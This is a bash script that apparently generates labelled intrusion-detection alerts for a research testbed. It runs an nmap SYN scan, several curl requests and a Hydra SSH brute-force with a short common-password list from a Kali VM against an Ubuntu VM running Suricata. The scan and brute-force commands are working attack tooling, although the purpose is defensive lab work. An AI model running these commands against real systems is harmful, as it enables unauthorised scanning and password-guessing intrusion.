#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# -----------------------------------------------------------------
# Automated Attack Simulation Script from Kali Linux VM to Ubuntu VM
# -----------------------------------------------------------------
# This script performs a sequence of attack simulations including:
#   1. Port scanning (Nmap)
#   2. HTTP request using curl
#   3. SSH brute-force attempt using Hydra
#
# Make sure:
#   - The target IP is reachable
#   - Suricata is running on the target (Ubuntu) VM
#   - You run this script as root or with sudo privileges
# -----------------------------------------------------------------

# ------------------ USER INPUTS (Modify as needed) ------------------
TARGET_IP="<TARGET_IP>"     # <-- Update this if your Ubuntu IP changes
USERNAME="user"                # <-- Ubuntu VM username
PASSWORD_FILE="passwords.txt" # <-- File containing password guesses (must include the correct one for your lab user)

# ------------------ STEP 0: Check Dependencies ------------------
echo "[+] Checking for required tools (nmap, curl, hydra)..."
for tool in nmap curl hydra; do
  if ! command -v $tool &> /dev/null; then
    echo "[-] Error: $tool is not installed. Install it before running this script."
    exit 1
  fi
done

echo "[+] All tools are present. Proceeding..."

# ------------------ STEP 1: Port Scan ------------------
echo "[+] Performing Nmap SYN scan on $TARGET_IP..."
nmap -sS -Pn -T4 -p 1-1000 $TARGET_IP -oN nmap_scan_results.txt
sleep 2

# ------------------ STEP 2: Simulate HTTP GET ------------------
echo "[+] Simulating HTTP GET request..."

# Try multiple realistic HTTP GETs to ensure Suricata detects them
for i in {1..3}; do
  curl -A "Mozilla/5.0" http://$TARGET_IP/ -o /dev/null --connect-timeout 2
  sleep 1
done

echo "[+] HTTP GET requests sent."


# ------------------ STEP 3: Create Password File ------------------
echo "[+] Creating password file: $PASSWORD_FILE"
echo -e "123456\nadmin\npassword\n<TARGET_PASSWORD>\nletmein" > $PASSWORD_FILE

# ------------------ STEP 4: SSH Brute-Force ------------------
echo "[+] Launching brute-force SSH attack with Hydra..."
hydra -l $USERNAME -P $PASSWORD_FILE ssh://$TARGET_IP -t 4 -V -o hydra_results.txt

# ------------------ Cleanup ------------------
echo "[+] Attack simulation complete. Logs saved as follows:"
echo "    - Nmap results:       nmap_scan_results.txt"
echo "    - Hydra brute-force:  hydra_results.txt"
echo "    - Passwords used:     $PASSWORD_FILE"

exit 0
